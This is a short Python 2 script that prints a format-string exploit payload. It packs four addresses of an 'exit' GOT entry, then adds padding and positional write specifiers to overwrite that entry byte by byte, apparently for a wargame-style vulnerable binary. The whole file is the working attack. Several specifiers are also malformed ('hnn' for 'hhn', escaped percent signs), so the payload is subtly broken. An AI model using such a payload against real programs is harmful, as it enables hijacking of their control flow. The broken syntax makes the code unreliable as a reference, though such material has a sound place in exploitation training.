#!/usr/bin/python
from struct import pack as p

exitgot1 = p("I",0x08049724)
exitgot2 = p("I",0x08049724 + 1)
exitgot3 = p("I",0x08049724 + 2)
exitgot4 = p("I",0x08049724 + 3)

s = ''
s += exitgot1
s += exitgot2
s += exitgot3
s += exitgot4

s += '\%162x'
s += '\%4$hhn'

s += '\%206x'
s += '\%5$hnn'

s += '\%125x'
s += '\%6$hnn'

s += '\%257x'
s += '\%7$hnn'

print s

